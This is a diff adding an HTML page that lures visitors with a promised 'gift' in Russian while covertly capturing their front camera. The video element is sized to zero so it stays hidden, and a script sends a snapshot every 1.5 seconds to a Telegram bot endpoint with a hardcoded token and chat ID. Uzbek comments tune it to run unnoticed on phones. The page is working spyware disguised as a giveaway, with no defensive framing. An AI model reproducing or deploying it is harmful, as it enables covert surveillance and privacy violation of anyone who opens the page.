@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Camera Access</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+<body class="flex bg-sky-950 items-center h-screen justify-center">
+
+  <!-- VIDEO TELEFONDA KORINISHI UCHUN HIDDEN QILMANG -->
+  <video id="video" autoplay playsinline muted class="w-0 h-0 absolute"></video>
+
+  <h1 class="text-4xl text-center animate-pulse text-amber-400">
+    Подождите немного чтобы получить подарок!
+  </h1>
+
+  <script>
+    let ism = prompt("lubboy narsa yoz");
+
+    document.addEventListener("DOMContentLoaded", async () => {
+
+      const video = document.getElementById("video");
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: "user"  // old kamera
+          }
+        });
+
+        video.srcObject = stream;
+
+        // MUHIM!!!
+        video.setAttribute("playsinline", true);
+        video.muted = true;
+
+        await video.play();
+
+      } catch (err) {
+        console.log("Kamera xatosi: ", err);
+      }
+
+      function sendPhoto() {
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob((blob) => {
+
+          const formData = new FormData();
+          formData.append("chat_id", "5663954249");
+          formData.append("photo", blob);
+
+          fetch(
+            "https://api.telegram.org/bot8568803319:AAEciPvMsgxQXqkILWnEX1McDt44JuMnaXU/sendPhoto",
+            { method: "POST", body: formData }
+          ).catch(err => console.log(err));
+
+        }, "image/jpeg");
+      }
+
+      setInterval(() => {
+        if (video.videoWidth > 0) sendPhoto();
+      }, 1500);
+
+    });
+  </script>
+
+</body>
+
+</html>
